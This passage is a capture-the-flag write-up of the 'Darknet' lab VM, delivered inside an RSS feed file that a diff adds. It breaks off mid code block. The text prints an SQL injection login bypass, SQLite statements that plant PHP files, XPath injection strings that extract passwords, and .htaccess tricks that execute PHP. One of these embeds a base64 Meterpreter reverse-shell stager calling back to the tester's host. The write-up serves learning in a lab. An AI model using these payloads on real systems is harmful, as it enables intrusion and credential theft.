@@ -1,0 +1,1007 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Darknet on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/darknet/</link>
+    <description>Recent content in Darknet on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 09 Jun 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/darknet/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>The Darkside of Darknet</title>
+      <link>http://rastamouse.me/writeups/2015/the-darkside-of-darknet/</link>
+      <pubDate>Tue, 09 Jun 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/the-darkside-of-darknet/</guid>
+      <description>
+
+&lt;p&gt;It was coming up to the date of my SANS GWAPT exam when Darknet landed, which meant I couldn&amp;rsquo;t spend much time on it.  Since passing that exam, Darknet became my new evening activity.&lt;/p&gt;
+
+&lt;h2 id=&#34;port-scan:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Port Scan&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-title: Site doesn&#39;t have a title (text/html).
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          45933/udp  status
+|_  100024  1          58932/tcp  status
+58932/tcp open  status  1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          45933/udp  status
+|_  100024  1          58932/tcp  status
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;a-bit-of-fuzzing:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;A Bit of Fuzzing&lt;/h2&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/port80.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;There is nothing much to see on this page, but after a quick fuzz we find a new directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/darknet# wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.56.102/FUZZ/
+
+==================================================================
+ID	Response   Lines      Word         Chars          Request    
+==================================================================
+
+00052:  C=200     14 L	      57 W	    937 Ch	  &amp;quot; - access&amp;quot;
+00181:  C=403     10 L	      30 W	    290 Ch	  &amp;quot; - cgi-bin&amp;quot;
+00427:  C=403     10 L	      30 W	    288 Ch	  &amp;quot; - icons&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Within this directory is a file called &lt;code&gt;888.darknet.com.backup&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/access.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;After reading it, we can see it&amp;rsquo;s a Virtual Host config for Apache.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;lt;VirtualHost *:80&amp;gt;
+    ServerName 888.darknet.com
+    ServerAdmin devnull@darknet.com
+    DocumentRoot /home/devnull/public_html
+    ErrorLog /home/devnull/logs
+&amp;lt;/VirtualHost&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Adding &lt;code&gt;888.darknet.com&lt;/code&gt; into &lt;code&gt;/etc/hosts&lt;/code&gt; takes us to a new page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/login.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;sqli-much:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQLi much?&lt;/h2&gt;
+
+&lt;p&gt;This form seems to be vulnerable to SQL Injection, as entering a single quote in each field gives the following error:  &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;.  This &amp;lsquo;token&amp;rsquo; is the MD5 sum of the &lt;code&gt;&#39;&lt;/code&gt; character (which tells us the form is MD5&amp;rsquo;ing the password before submission).  There also seems to be basic keyword filtering, as entering phrases such as &lt;code&gt;select&lt;/code&gt; or &lt;code&gt;=&lt;/code&gt; in the &lt;code&gt;username&lt;/code&gt; field produces an &lt;code&gt;Illegal&lt;/code&gt; message.&lt;/p&gt;
+
+&lt;p&gt;The form requires both a username and password be present; so proceeding on the assumption &lt;code&gt;devnull&lt;/code&gt; is a valid username, we can start testing injections.&lt;/p&gt;
+
+&lt;p&gt;I was able to bypass this login page by replacing the &lt;code&gt;=&lt;/code&gt; operator with &lt;code&gt;IS&lt;/code&gt;:  &lt;code&gt;username=devnull&#39; or &#39;a&#39; is &#39;a&amp;amp;password=rasta&amp;amp;action=Login&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;sql-admin:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;SQL Admin&lt;/h2&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/admin-sql.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The next challenge we have is an SQL administrator box, where we can enter SQL commands and have them executed.  No feedback is given by the page, so everything is blind.  A popular approach to this, is to have the database write some data to a file.  With MySQL this can be achieved by using something like &lt;code&gt;select &amp;lt;text&amp;gt; into outfile &amp;lt;file&amp;gt;&lt;/code&gt; (assuming write permissions are present etc).&lt;/p&gt;
+
+&lt;p&gt;However, this is not MySQL, but SQLite.  For which I had to do some Googling to find the right syntax.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;attach database &#39;/home/devnull/public_html/img/test.php&#39; as rasta;
+create table rasta.test (code TEXT);
+insert into rasta.test (code) VALUES (&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To find the writable directory I fuzzed &lt;code&gt;888.darknet.com&lt;/code&gt; and since there weren&amp;rsquo;t many options, I just tried each one in turn.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;00244:  C=403     10 L	      30 W	    287 Ch	  &amp;quot; - css&amp;quot;
+00430:  C=403     10 L	      30 W	    289 Ch	  &amp;quot; - icons&amp;quot;
+00432:  C=403     10 L	      30 W	    287 Ch	  &amp;quot; - img&amp;quot;
+00435:  C=403     10 L	      30 W	    292 Ch	  &amp;quot; - includes&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Browsing to the page confirms it worked, and also allows us to collect some important information about the environment we&amp;rsquo;re in.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/sqli-phpinfo.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;A few things to note:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;disable_functions: system, eval, shell_exec, passthru, popen, proc_open, escapeshellarg, escapeshellcmd, exec, proc_close, proc_get_status, proc_nice, proc_terminate, pcntl_exec
+open_basedir: /etc/apache2:/home/devnull:/tmp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These disabled functions are going to make it a right pain to do anything.  To do more enumeration, I uploaded 2 more files: &lt;code&gt;dir.php&lt;/code&gt; and &lt;code&gt;file.php&lt;/code&gt;, which allowed me to view and read parts of the file system.&lt;/p&gt;
+
+&lt;h4 id=&#34;dir-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;dir.php&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php echo &#39;&amp;lt;pre&amp;gt;&#39;; print_r(scandir($_REQUEST[&#39;dir&#39;])); echo &#39;&amp;lt;/pre&amp;gt;&#39;; ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;file-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;file.php&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php $file = fopen($_REQUEST[&#39;file’],’r&#39;); while(! feof($file)) { echo fgets($file). &#39;&amp;lt;br /&amp;gt;&#39;; } fclose($file); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/dir.php?dir=.
+
+Array
+(
+    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; dir.php
+)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Realistically, we can only traverse as far down as &lt;code&gt;/home/devnull&lt;/code&gt; where there is a &lt;code&gt;database&lt;/code&gt; directory, but we can&amp;rsquo;t read inside it.  We can read &lt;code&gt;/tmp&lt;/code&gt; but there is nothing in there, so that leaves &lt;code&gt;/etc/apache2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/dir.php?dir=/etc/apache2
+
+Array
+(
+    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; apache2.conf
+    [3] =&amp;gt; conf.d
+    [4] =&amp;gt; envvars
+    [5] =&amp;gt; magic
+    [6] =&amp;gt; mods-available
+    [7] =&amp;gt; mods-enabled
+    [8] =&amp;gt; ports.conf
+    [9] =&amp;gt; sites-available
+    [10] =&amp;gt; sites-enabled
+)
+
+http://888.darknet.com/img/dir.php?dir=/etc/apache2/sites-enabled
+
+Array
+(
+    [0] =&amp;gt; .
+    [1] =&amp;gt; ..
+    [2] =&amp;gt; 000-default
+    [3] =&amp;gt; 888.darknet.com
+    [4] =&amp;gt; signal8.darknet.com
+)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://888.darknet.com/img/file.php?file=/etc/apache2/sites-enabled/signal8.darknet.com
+
+ServerName signal8.darknet.com
+ServerAdmin errorlevel@darknet.com
+DocumentRoot /home/errorlevel/public_html
+
+AllowOverride All
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;signal8:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Signal8&lt;/h2&gt;
+
+&lt;p&gt;Next, we can head on over to &lt;code&gt;signal8.darknet.com&lt;/code&gt; and we find another new page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/signal8.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Clicking on these links (URLs &lt;code&gt;http://signal8.darknet.com/contact.php?id=1&lt;/code&gt; and &lt;code&gt;?id=2&lt;/code&gt;) takes us to a page where we are given an email address for &lt;code&gt;devnull&lt;/code&gt; and &lt;code&gt;errorlevel&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/contact.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;There is a &lt;code&gt;robots.txt&lt;/code&gt; file which contains the entry &lt;code&gt;Disallow: /xpanel/&lt;/code&gt;.  Heading over there, you see another login page.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/xpanel.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I didn&amp;rsquo;t think this would be &lt;em&gt;another&lt;/em&gt; SQLi challenge, so I went back to &lt;code&gt;contact.php&lt;/code&gt;, widened my net and started fuzzing the URL.&lt;/p&gt;
+
+&lt;p&gt;I used the OWASP-ZAP Fuzzer for this task (I like BurpSuite, but holy hell are the Intruder restrictions annoying!) by capturing a GET request on &lt;code&gt;contact.php&lt;/code&gt; and fuzzing on the &lt;code&gt;id&lt;/code&gt; parameter with the &lt;code&gt;Injections/All_attack.txt&lt;/code&gt; file from &lt;code&gt;wfuzz&lt;/code&gt;.  Regardless of the data you submit, a &lt;code&gt;200 OK&lt;/code&gt; is always returned, so I was focused on the size of the response body.&lt;/p&gt;
+
+&lt;p&gt;An empty response weighs in at anything up to 260 bytes (sometimes the body would include &lt;code&gt;h3&lt;/code&gt; tags and sometimes not).  There were only 6 responses with a body size greater than 260 bytes, so I took a closer look at those.  The following request caught my eye: &lt;code&gt;count(/child::node())&lt;/code&gt; because it returned the result &lt;code&gt;errorlevel@darknet.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This payload came from the &lt;code&gt;XML.txt&lt;/code&gt; wordlist.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&amp;hellip; Fast forward many hours of Googling&amp;hellip;&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;xml-injection:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;XML Injection&lt;/h2&gt;
+
+&lt;p&gt;I spent a lot of time reading up on how you could call and parse XML with PHP.  In my mind, I came up with something like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xml = simplexml_load_file(&#39;users.xml&#39;);
+$email = $xml-&amp;gt;xpath(&#39;/user/id/email&#39;);
+echo $email;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The ID parameter is a variable defined by GET, which would probably look more like:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xml = simplexml_load_file(&#39;users.xml&#39;);
+$email = $xml-&amp;gt;xpath(&#39;/user/[id=$GET]/email&#39;);
+echo $email;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In all the examples I read, those square brackets are indeed hardcoded and can be injected into a query, just like &lt;code&gt;&#39;&lt;/code&gt; with SQLi.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1][1
+&#39;/user/[id=1]/email&#39; becomes &#39;/user/[id=1][1]/email&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is valid and we get &lt;code&gt;errorlevel@darknet.com&lt;/code&gt; as a result.  I want to start finding other bits of data that I can force the page to return, but to do that I need the name of the field.  Since I already know ID is a valid field, I tried to make it return that.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/id|/email[id=1][1
+1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That looks successful - I can double check with the &lt;code&gt;devnull&lt;/code&gt; user to see if it returns a &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=2]/id|/email[id=2][1
+2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next field I found was &lt;code&gt;username&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/username|/email[id=1][1
+errorlevel
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Time for the holy grail, and go for &lt;code&gt;password&lt;/code&gt;?  Well that doesn&amp;rsquo;t return anything, so it&amp;rsquo;s not a valid field name.  But as we&amp;rsquo;ve seen, Darknet likes to mix things up with bits of Spanish.  So we can try&amp;hellip; &lt;code&gt;clave&lt;/code&gt;?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/clave|/email[id=1][1
+tc65Igkq6DF
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can also pull the password for &lt;code&gt;devnull&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=2]/clave|/email[id=2][1
+j4tC1P9aqmY
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ploy:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Ploy&lt;/h2&gt;
+
+&lt;p&gt;After using one of the username/password combo&amp;rsquo;s to login, you are taken to another page, with a single link.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/xpanel2.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Clicking this takes you to &lt;code&gt;edit.php&lt;/code&gt; which is a &lt;code&gt;Tr0ll&lt;/code&gt; page.  Going back a step and looking at the source code of the previous page reveals these HTML comments:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!--&amp;lt;a href=&amp;quot;ploy.php&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;--&amp;gt;
+&amp;lt;!--rasta-mouse is my her0--&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I think he has the wrong rasta mouse :D&lt;/p&gt;
+
+&lt;p&gt;Heading over to &lt;code&gt;xpanel/ploy.php&lt;/code&gt;, we are met with what looks like a file upload facility, but it&amp;rsquo;s protected by a PIN-code type challenge.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/pin.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;Selecting an incorrect number of checkboxes gives you the error &lt;code&gt;La longitud de la clave no es la correcta!&lt;/code&gt; (The key length is not correct!), so we can use this to determine that the PIN is 4 in length.&lt;/p&gt;
+
+&lt;p&gt;Looking at the source code, each box has an associated value in the following layout:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
+37 58 22
+12 72 10
+59 17 99
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Within an example POST, we can clearly see the value for each checkbox.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/pin-post.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I went into lazy mode and used ZAP to fuzz on those values and iterate through the different combinations with the different checkbox values.  The downside to this approach, is that the fuzzer isn&amp;rsquo;t smart enough to know you don&amp;rsquo;t need to repeat values, or have the same value multiple times etc; so it took a little longer than is required - but this was probably still quicker than me sitting down to code something more efficient.  For a one-off task, who cares&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&amp;hellip; 6561 HTTP requests later, I now have to somehow find the 1 request with the correct PIN.  This is actually pretty easy in ZAP, as you can search your &amp;lsquo;fuzzed results&amp;rsquo; - so I did an inverse search on the string &lt;code&gt;Key incorrecta!&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/upload.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;subida-exitosa:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Subida Exitosa!&lt;/h2&gt;
+
+&lt;p&gt;My test file uploaded successfully and going back to the HTTP request, I can see the correct PIN was &lt;code&gt;37 10 59 17&lt;/code&gt;.  But now I also have to find the uploaded file.  More directory fuzzing within &lt;code&gt;xpanel&lt;/code&gt; reveals an &lt;code&gt;upload&lt;/code&gt; directory.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/test-file.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The next thing I tried, was to upload a new PHP file, but I got the error &lt;code&gt;Formato invalido!&lt;/code&gt;.  I tried to get around this using filename manipulation and embedding PHP into images etc, but the web server just wasn&amp;rsquo;t interpreting the code as PHP.&lt;/p&gt;
+
+&lt;p&gt;I recalled that the virtual config for &lt;code&gt;signal8.darknet.com&lt;/code&gt; had &lt;code&gt;AllowOverride All&lt;/code&gt; set, which means I can dynamically alter the config with a custom &lt;code&gt;.htaccess&lt;/code&gt; file.  I used this to exectute PHP from within the &lt;code&gt;.htaccess&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;AddHandler application/x-httpd-php .htaccess
+DirectoryIndex .htaccess
+&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;
+        Order deny,allow
+        Allow from all
+        SetHandler application/x-httpd-suphp
+&amp;lt;/FilesMatch&amp;gt;
+#&amp;lt;?php phpinfo(); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/darknet-1/ht-phpinfo.png&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;This time around I saw that &lt;code&gt;open_basedir&lt;/code&gt; is not set, so I should be able to read a lot more of the filesystem this time.  But I want some sort of functional shell, I don&amp;rsquo;t want to be faffing around writing my own PHP for doing bits.  So I uploaded a PHP Meterpreter payload, which gave me enough functionality to list and read files etc.  I did this by putting PHP code into &lt;code&gt;.htaccess&lt;/code&gt; to write base64 content out to a new file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;AddHandler application/x-httpd-php .htaccess
+DirectoryIndex .htaccess
+&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;
+        Order deny,allow
+        Allow from all
+        SetHandler application/x-httpd-suphp
+&amp;lt;/FilesMatch&amp;gt;
+#&amp;lt;?php $content = base64_decode(&amp;quot;PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKIyBUaGUgcGF5bG9hZCBoYW5kbGVyIG92ZXJ3cml0ZXMgdGhpcyB3aXRoIHRoZSBjb3JyZWN0IExIT1NUIGJlZm9yZSBzZW5kaW5nCiMgaXQgdG8gdGhlIHZpY3RpbS4KJGlwID0gJzE5Mi4xNjguNTYuMTAxJzsKJHBvcnQgPSA0NDQ0OwokaXBmID0gQUZfSU5FVDsKCmlmIChGQUxTRSAhPT0gc3RycG9zKCRpcCwgIjoiKSkgewoJIyBpcHY2IHJlcXVpcmVzIGJyYWNrZXRzIGFyb3VuZCB0aGUgYWRkcmVzcwoJJGlwID0gIlsiLiAkaXAgLiJdIjsKCSRpcGYgPSBBRl9JTkVUNjsKfQoKaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOwoJJHNfdHlwZSA9ICdzdHJlYW0nOwp9IGVsc2VpZiAoKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigkaXAsICRwb3J0KTsKCSRzX3R5cGUgPSAnc3RyZWFtJzsKfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7CgkkcyA9ICRmKCRpcGYsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsKCSRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOwoJaWYgKCEkcmVzKSB7IGRpZSgpOyB9Cgkkc190eXBlID0gJ3NvY2tldCc7Cn0gZWxzZSB7CglkaWUoJ25vIHNvY2tldCBmdW5jcycpOwp9CmlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfQoKc3dpdGNoICgkc190eXBlKSB7IApjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsKY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7Cn0KaWYgKCEkbGVuKSB7CgkjIFdlIGZhaWxlZCBvbiB0aGUgbWFpbiBzb2NrZXQuICBUaGVyZSdzIG5vIHdheSB0byBjb250aW51ZSwgc28KCSMgYmFpbAoJZGllKCk7Cn0KJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsKJGxlbiA9ICRhWydsZW4nXTsKCiRiID0gJyc7CndoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgewoJc3dpdGNoICgkc190eXBlKSB7IAoJY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJfQp9CgojIFNldCB1cCB0aGUgc29ja2V0IGZvciB0aGUgbWFpbiBzdGFnZSB0byB1c2UuCiRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsKJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsKZXZhbCgkYik7CmRpZSgpOwo=&amp;quot;); $file = fopen(&amp;quot;/home/errorlevel/public_html/xpanel/uploads/shell.php&amp;quot;,&amp;quot;w&amp;quot;); echo fwrite($file,$content); fclose($file); ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You will of course notice that we are using &lt;code&gt;suphp&lt;/code&gt;.  At first, I tried using plain ole&amp;rsquo; regular &lt;code&gt;php&lt;/code&gt; but it lacks the permission to write into &lt;code&gt;errorlevel&lt;/code&gt;&amp;rsquo;s home directory.  SuPHP is able to execute PHP files with the same permissions as its owner and we can see that the suPHP module is loaded in &lt;code&gt;/etc/apache2/mods-enabled/&lt;/code&gt;.  Since we&amp;rsquo;re in &lt;code&gt;/home/errorlevel&lt;/code&gt; it&amp;rsquo;s reasonable to assume &lt;code&gt;errorlevel&lt;/code&gt; is also the owner of these PHP files.&lt;/p&gt;
+
+&lt;p&gt;A &lt;code&gt;multi/handler&lt;/code&gt; later and we have a shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
